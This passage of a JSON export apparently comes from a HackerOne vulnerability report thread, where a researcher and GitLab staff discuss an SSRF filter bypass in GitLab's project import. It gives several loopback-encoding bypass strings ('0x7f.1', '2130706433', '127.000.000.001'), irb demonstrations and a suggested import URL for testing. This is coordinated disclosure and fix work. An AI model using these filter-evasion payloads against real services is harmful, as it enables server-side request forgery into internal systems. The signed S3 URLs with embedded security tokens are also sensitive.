src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/230/832/dd4e05b85851f50718f8e894cd04f59889c6740d/Screenshot_from_2017-10-19_18-07-53.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223006Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=921a2fb7721d3c2991dea327c3ce68361fcad813b2ee566067319de5a057c316\" class=\"markdown-inline-image\"></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2084807, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-10-20T11:32:13.733Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-10-20T11:32:13.733Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "@edio,\n\nThanks for the heads-up. In this case that library wouldn't help. The issue is that these alternative representations of IPs may not resolve at all depending on the host and DNS settings. In cases where that happens our SSRF protection code defaults to allowing the connection attempt and the underlying OS makes the conversion itself.\n\nWe can't simply block all non-resolving hostnames as any project saved when DNS was down would fail. \n\nThe fix we're working on merging requires a hostname to resolve before a connection is made, but not when saving a project. We'll try to get that merged before your deadline. I'll get back in touch soon!", 
+            "markdown_message": "<p><a href=\"/edio\">@edio</a>,</p>\n\n<p>Thanks for the heads-up. In this case that library wouldn&#39;t help. The issue is that these alternative representations of IPs may not resolve at all depending on the host and DNS settings. In cases where that happens our SSRF protection code defaults to allowing the connection attempt and the underlying OS makes the conversion itself.</p>\n\n<p>We can&#39;t simply block all non-resolving hostnames as any project saved when DNS was down would fail. </p>\n\n<p>The fix we&#39;re working on merging requires a hostname to resolve before a connection is made, but not when saving a project. We&#39;ll try to get that merged before your deadline. I&#39;ll get back in touch soon!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2087666, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-02T09:27:11.797Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-02T09:27:11.797Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @briann,\n\nJust to double-check, as stated above the deadline for public disclosure is tomorrow (**Friday, 3 November 2017**) and I wanted to know if you believe you will be able to provide a patch by then. Otherwise, I will have to warn people first today so that they can prepare for the actual write-up tomorrow.\n\nOn top of that, just to make sure you understand everything, this deadline only applies to this report and **not** all my other old reports.", 
+            "markdown_message": "<p>Hi <a href=\"/briann\">@briann</a>,</p>\n\n<p>Just to double-check, as stated above the deadline for public disclosure is tomorrow (<strong>Friday, 3 November 2017</strong>) and I wanted to know if you believe you will be able to provide a patch by then. Otherwise, I will have to warn people first today so that they can prepare for the actual write-up tomorrow.</p>\n\n<p>On top of that, just to make sure you understand everything, this deadline only applies to this report and <strong>not</strong> all my other old reports.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2124005, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-02T15:22:19.607Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-02T15:22:19.607Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @edio,\n\nIt looks like I made a mistake and got the date wrong. I've been telling our development and release teams that it was going public on the 15th. We do have the patches ready and merged. We're just waiting on a couple of other patches that we'd like to get included in the release as well. I'll let everyone know and see if there's a chance the release can happen before tomorrow, but it is unlikely (we have a normal release going out today). If you're unable to delay until next week we completely understand. ", 
+            "markdown_message": "<p>Hi <a href=\"/edio\">@edio</a>,</p>\n\n<p>It looks like I made a mistake and got the date wrong. I&#39;ve been telling our development and release teams that it was going public on the 15th. We do have the patches ready and merged. We&#39;re just waiting on a couple of other patches that we&#39;d like to get included in the release as well. I&#39;ll let everyone know and see if there&#39;s a chance the release can happen before tomorrow, but it is unlikely (we have a normal release going out today). If you&#39;re unable to delay until next week we completely understand. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2125411, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-02T15:26:24.063Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-02T15:26:24.063Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi @briann,\n\nBecause of your transparency and the fact that you constantly kept me up to date, I will delay the public disclosure of this report until next week (**Friday, 10 November 2017**). Would that work for you?", 
+            "markdown_message": "<p>Hi <a href=\"/briann\">@briann</a>,</p>\n\n<p>Because of your transparency and the fact that you constantly kept me up to date, I will delay the public disclosure of this report until next week (<strong>Friday, 10 November 2017</strong>). Would that work for you?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2125419, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-02T15:29:18.079Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-02T15:29:18.079Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Yes, that would be great. I know I really appreciate it since this was my screw-up. We don't perform security releases on weekends so if it doesn't go out tomorrow it will likely be Monday or Tuesday. Thanks for understanding.", 
+            "markdown_message": "<p>Yes, that would be great. I know I really appreciate it since this was my screw-up. We don&#39;t perform security releases on weekends so if it doesn&#39;t go out tomorrow it will likely be Monday or Tuesday. Thanks for understanding.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2125426, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-02T15:34:59.938Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-02T15:34:59.938Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "I publicly announced the delay: https://twitter.com/EdOverflow/status/926109833719369729.\n\nWould it be possible to show me where GitLab forwards on the IP address to the operating system? I figured out that Ruby's Resolv is unable to process the IPs provided above, but I am unable to locate where the actual forwarding takes place.\n\n```\nirb(main):001:0> require \"resolv\"\n=> true\nirb(main):002:0> Resolv.getaddress \"127.0.0.1\"\n=> \"127.0.0.1\"\nirb(main):003:0> Resolv.getaddress \"0177.1\"\nResolv::ResolvError: no address for 0177.1\n\tfrom /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress'\n\tfrom /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress'\n\tfrom (irb):3\n\tfrom /usr/bin/irb:11:in `<main>'\nirb(main):004:0> Resolv.getaddress \"0x7f.1\"\nResolv::ResolvError: no address for 0x7f.1\n\tfrom /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress'\n\tfrom /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress'\n\tfrom (irb):4\n\tfrom /usr/bin/irb:11:in `<main>'\n```", 
+            "markdown_message": "<p>I publicly announced the delay: <a title=\"https://twitter.com/EdOverflow/status/926109833719369729\" href=\"/redirect?signature=0c4d2883ee4dbf778bf9e9e6d93d1654688af0c7&amp;url=https%3A%2F%2Ftwitter.com%2FEdOverflow%2Fstatus%2F926109833719369729\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://twitter.com/EdOverflow/status/926109833719369729</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>Would it be possible to show me where GitLab forwards on the IP address to the operating system? I figured out that Ruby&#39;s Resolv is unable to process the IPs provided above, but I am unable to locate where the actual forwarding takes place.</p>\n<pre class=\"highlight plaintext\"><code>irb(main):001:0&gt; require &quot;resolv&quot;\n=&gt; true\nirb(main):002:0&gt; Resolv.getaddress &quot;127.0.0.1&quot;\n=&gt; &quot;127.0.0.1&quot;\nirb(main):003:0&gt; Resolv.getaddress &quot;0177.1&quot;\nResolv::ResolvError: no address for 0177.1\n    from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress&#39;\n    from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress&#39;\n    from (irb):3\n    from /usr/bin/irb:11:in `&lt;main&gt;&#39;\nirb(main):004:0&gt; Resolv.getaddress &quot;0x7f.1&quot;\nResolv::ResolvError: no address for 0x7f.1\n    from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress&#39;\n    from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress&#39;\n    from (irb):4\n    from /usr/bin/irb:11:in `&lt;main&gt;&#39;\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 2125454, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-02T19:31:27.218Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-02T19:31:27.218Z", 
+            "actor": {
+                "username": "briann", 
+                "url": "/briann", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "The problem stems from the Ruby Resolver library not 100% matching what will be resolved by the OS. You probably remember when you first reported this that initially I was unable to duplicate your findings. In a Rails console the \"0177.1\" string was resolving properly to \"127.0.0.1\" on both my test instances and on GitLab.com. But at some point later that day they stopped resolving at all. It could be a caching issue or an issue in the Resolver library itself, but I was unable to determine the reason why it would sometimes resolve and sometimes not. It could even depend on the configuration of whatever DNS server responds to the query.\n\nIn any case, at least for Debian/Ubuntu, the OS always seems to translate these values to 127.0.0.1 when a connection is opened... without using a DNS lookup. Since we have no easy way to determine for sure what strings every OS will translate automatically it's safer to simply deny connections to hosts without DNS entries altogether. ", 
+            "markdown_message": "<p>The problem stems from the Ruby Resolver library not 100% matching what will be resolved by the OS. You probably remember when you first reported this that initially I was unable to duplicate your findings. In a Rails console the &quot;0177.1&quot; string was resolving properly to &quot;127.0.0.1&quot; on both my test instances and on GitLab.com. But at some point later that day they stopped resolving at all. It could be a caching issue or an issue in the Resolver library itself, but I was unable to determine the reason why it would sometimes resolve and sometimes not. It could even depend on the configuration of whatever DNS server responds to the query.</p>\n\n<p>In any case, at least for Debian/Ubuntu, the OS always seems to translate these values to 127.0.0.1 when a connection is opened... without using a DNS lookup. Since we have no easy way to determine for sure what strings every OS will translate automatically it&#39;s safer to simply deny connections to hosts without DNS entries altogether. </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2129141, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/235/808/795498bfda3437279ccc7295184cab818c86a72b/new_bypass.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223006Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=18b87378784475a1f451710f5f3b30f1e51e42fa73e9b519ec4ddaa03e84032f", 
+                    "type": "image/png", 
+                    "id": 235808, 
+                    "filename": "new_bypass.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-11-02T20:06:24.527Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-02T20:06:24.527Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "That makes sense. I am currently running a GitLab CE instance on Ubuntu and I can see that the OS can resolve the address by using `inet_aton()`, but Ruby's Resolv fails to resolve it.\n\n```\n$ ltrace ping 0x7f.1 2>&1 | grep 0x7f.1\ninet_aton(\"0x7f.1\", { 0x100007f })               = 1\n```\n\nBy the way, I found another bypass using `http://2130706433/`:\n\n```\nirb(main):001:0> require 'resolv'\n=> true\nirb(main):002:0> Resolv.getaddress \"2130706433\"\nResolv::ResolvError: no address for 2130706433\n    from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress'\n    from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress'\n    from (irb):2\n    from /usr/bin/irb:11:in `<main>'\n```\n```\n$ ltrace ping 2130706433 2>&1 | grep 2130706433\ninet_aton(\"2130706433\", { 0x100007f })           = 1\n```\n\n{F235808}\n\nI am currently investigating another potential bypass by playing around with DNS TOCTOU.", 
+            "markdown_message": "<p>That makes sense. I am currently running a GitLab CE instance on Ubuntu and I can see that the OS can resolve the address by using <code>inet_aton()</code>, but Ruby&#39;s Resolv fails to resolve it.</p>\n<pre class=\"highlight plaintext\"><code>$ ltrace ping 0x7f.1 2&gt;&amp;1 | grep 0x7f.1\ninet_aton(&quot;0x7f.1&quot;, { 0x100007f })               = 1\n</code></pre>\n<p>By the way, I found another bypass using <code>http://2130706433/</code>:</p>\n<pre class=\"highlight plaintext\"><code>irb(main):001:0&gt; require &#39;resolv&#39;\n=&gt; true\nirb(main):002:0&gt; Resolv.getaddress &quot;2130706433&quot;\nResolv::ResolvError: no address for 2130706433\n    from /usr/lib/ruby/2.3.0/resolv.rb:95:in `getaddress&#39;\n    from /usr/lib/ruby/2.3.0/resolv.rb:45:in `getaddress&#39;\n    from (irb):2\n    from /usr/bin/irb:11:in `&lt;main&gt;&#39;\n</code></pre><pre class=\"highlight plaintext\"><code>$ ltrace ping 2130706433 2&gt;&amp;1 | grep 2130706433\ninet_aton(&quot;2130706433&quot;, { 0x100007f })           = 1\n</code></pre>\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"new_bypass.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/235/808/795498bfda3437279ccc7295184cab818c86a72b/new_bypass.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223006Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=18b87378784475a1f451710f5f3b30f1e51e42fa73e9b519ec4ddaa03e84032f\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/235/808/795498bfda3437279ccc7295184cab818c86a72b/new_bypass.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223006Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=18b87378784475a1f451710f5f3b30f1e51e42fa73e9b519ec4ddaa03e84032f\" class=\"markdown-inline-image\"></a></p>\n\n<p>I am currently investigating another potential bypass by playing around with DNS TOCTOU.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2129325, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-03T11:54:17.498Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-03T11:54:17.498Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "# Summary\n\nAh, now this is interesting. It appears that the root cause is in fact a combination of the Ruby resolver and the fact that you rely on it. It seems that it cannot be relied upon for security measures especially when it comes to blacklisting addresses. This should probably be documented somewhere.\n\n# Details\n\nThe following function blacklists addresses on GitLab: \n\n```ruby\ndef blocked_url?(url)\n       return false if url.nil?\n\n       blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n       blocked_ips.concat(Socket.ip_address_list.map(&:ip_address))\n\n       begin\n         uri = Addressable::URI.parse(url)\n         # Allow imports from the GitLab instance itself but only from the configured ports\n         return false if internal?(uri)\n\n         return true if blocked_port?(uri.port)\n         return true if blocked_user_or_hostname?(uri.user)\n         return true if blocked_user_or_hostname?(uri.hostname)\n\n         server_ips = Resolv.getaddresses(uri.hostname)\n         return true if (blocked_ips & server_ips).any?\n       rescue Addressable::URI::InvalidURIError\n         return true\nend\n```\n\nHere you are relying on Ruby's native resolver:\n\n```ruby\nserver_ips = Resolv.getaddresses(uri.hostname)\n```\n\nWe can replicate this on my machine:\n\n```\nirb(main):001:0> require 'resolv'\n=> true\nirb(main):002:0> uri = \"0x7f.1\"\n=> \"0x7f.1\"\nirb(main):003:0> server_ips = Resolv.getaddresses(uri)\n=> []\nirb(main):004:0> blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n=> [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\nirb(main):005:0> return true if (blocked_ips & server_ips).any?\n=> nil\n```\n\n# The Bug\n\nWhile playing around with different machines running Ubuntu, I noticed the following strange behaviour by Ruby's native resolver.\n\n| \ud83d\udcbb Machine 1                                        | \ud83d\udcbb Machine 2                                        |\n|--------------------------------------------------|--------------------------------------------------|\n| ```ruby 2.3.3p222 (2016-11-21) [x86_64-linux-gnu]``` | ```ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]``` |\n\n1) **\ud83d\udcbb Machine 1**:\n\n```\nirb(main):001:0> require 'resolv'\n=> true\nirb(main):002:0> uri = \"0x7f.1\"\n=> \"0x7f.1\"\nirb(main):003:0> server_ips = Resolv.getaddresses(uri)\n=> []\nirb(main):004:0> blocked_ips = [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\n=> [\"127.0.0.1\", \"::1\", \"0.0.0.0\"]\nirb(main):005:0> return true if (blocked_ips & server_ips).any?\n=> nil\n```\n\n2) **\ud83d\udcbb Machine 2**\n\n```\nirb(main):008:0> Resolv.getaddresses(\"127.0.0.1\")\n=> [\"127.0.0.1\"]\nirb(main):009:0> Resolv.getaddresses(\"localhost\")\n=> [\"127.0.0.1\"]\nirb(main):010:0> Resolv.getaddresses(\"127.000.000.1\")\n=> []\n```\n\n3) **\ud83d\udcbb Machine 1**\n\n```\nirb(main):002:0> Resolv.getaddresses(\"127.000.000.1\")\n=> [\"127.0.0.1\"]\n```\n\nThis clears most things up for me now. It was probably difficult to replicate this issue, because it depends on the machine/OS you are running `Resolv` on. This also explains the unusual delay times and loops for certain payloads.\n\nI will investigate this further and maybe contact the Ruby developers to see what they have to say.\n\n---\n\nConcerning you last statement:\n\n> Since we have no easy way to determine for sure what strings every OS will translate automatically it's safer to simply deny connections to hosts without DNS entries altogether.\n\nI would suggest using `Socket.getaddrinfo()` in order to determine what the OS thinks the address is and then perform the other tasks in `url_blocker.rb`.\n\n```\nirb(main):001:0> require 'socket'\n=> true\nirb(main):002:0> Socket.getaddrinfo(\"0x7f.1\", nil)\n=> [[\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 1, 6], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 2, 17], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 3, 0]]\nirb(main):003:0> Socket.getaddrinfo(\"0177.1\", nil)\n=> [[\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 1, 6], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 2, 17], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 3, 0]]\nirb(main):004:0> Socket.getaddrinfo(\"2130706433\", nil)\n=> [[\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 1, 6], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 2, 17], [\"AF_INET\", 0, \"127.0.0.1\", \"127.0.0.1\", 2, 3, 0]]\n```\n\n---\n\nAlso just to add to the list of bypasses, here is another one that actually resolves using Ruby's Resolv on **\ud83d\udcbb Machine 1**, but completely bypasses your exclusion list:\n\n```\nirb(main):001:0> require 'resolv'\n=> true\nirb(main):002:0> Resolv.getaddress \"127.000.000.001\"\n=> \"127.0.0.1\"\n```\n\nYou can verify this by importing `http://127.000.000.001:22/`.", 
+            "markdown_message": "<h1 id=\"summary\">Summary</h1>\n\n<p>Ah, now this is interesting. It appears that the root cause is in fact a combination of the Ruby resolver and the fact that you rely on it. It seems that it cannot be relied upon for security measures especially when it comes to blacklisting addresses. This should probably be documented somewhere.</p>\n\n<h1 id=\"details\">Details</h1>\n\n<p>The following function blacklists addresses on GitLab: </p>\n<pre class=\"highlight ruby\"><code><span class=\"k\">def</span> <span class=\"nf\">blocked_url?</span><span class=\"p\">(</span><span class=\"n\">url</span><span class=\"p\">)</span>\n       <span class=\"k\">return</span> <span class=\"kp\">false</span> <span class=\"k\">if</span> <span class=\"n\">url</span><span class=\"p\">.</span><span class=\"nf\">nil?</span>\n\n       <span class=\"n\">blocked_ips</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"s2\">&quot;127.0.0.1&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;::1&quot;</span><span class=\"p\">,</span> <span class=\"s2\">&quot;0.0.0.0&quot;</span><span class=\"p\">]</span>\n       <span class=\"n\">blocked_ips</span><span class=\"p\">.</span><span class=\"nf\">concat</span><span class=\"p\">(</span><span class=\"no\">Socket</span><span class=\"p\">.</span><span class=\"nf\">ip_address_list</span><span class=\"p\">.</span><span class=\"nf\">map</span><span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"ss\">:ip_address</span><span class=\"p\">))</span>\n\n       <span class=\"k\">begin</span>\n         <span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"no\">Addressable</span><span class=\"o\">::</span><span class=\"no\">URI</span><span class=\"p\">.</span><span class=\"nf\">parse</span><span class=\"p\">(</span><span class=\"n\">url</span><span class=\"p\">)</span>\n         <span class=\"c1\"># Allow imports from the GitLab instance itself but only from the configured ports</span>\n         <span class=\"k\">return</span> <span class=\"kp\">false</span> <span class=\"k\">if</span> <span class=\"n\">internal?</span><span class=\"p\">(</span><span class=\"n\">uri</span><span class=\"p\">)</span>\n\n         <span class=\"k\">return</span> <span class=\"kp\">true</span> <span class=\"k\">if</span> <span class=\"n\">blocked_port?</span><span class=\"p\">(</span><span class=\"n\">uri</span><span class=\"p\">.</span><span class=\"nf\">port</span><span class=\"p\">)</span>\n         <span class=\"k\">return</span> <span class=\"kp\">true</span> 